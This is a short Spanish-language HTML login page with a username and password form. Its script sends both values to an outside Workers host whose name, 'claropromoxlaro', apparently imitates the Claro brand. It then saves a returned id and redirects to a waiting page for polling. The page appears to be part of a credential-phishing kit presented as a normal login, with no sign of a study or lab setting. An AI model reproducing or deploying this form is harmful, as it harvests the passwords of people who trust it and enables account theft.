<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>Formulario de Acceso</h2>
  <form id="loginForm">
    <label>Usuario:</label>
    <input type="text" id="usuario" required><br><br>

    <label>Clave:</label>
    <input type="password" id="clave" required><br><br>

    <button type="submit">Enviar</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const usuario = document.getElementById("usuario").value;
      const clave = document.getElementById("clave").value;

      try {
        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ usuario, clave })
        });

        const data = await res.json();

        if (!data.ok) {
          alert("❌ Error al enviar: " + data.error);
          return;
        }

        // Guardamos el id temporal para el polling
        const id = data.id;
        localStorage.setItem("loginId", id);

        // Redirigimos a la página de espera
        window.location.href = "esperando.html";

      } catch(err) {
        alert("❌ Error al conectar al servidor: " + err.message);
      }
    });
  </script>
</body>
</html>
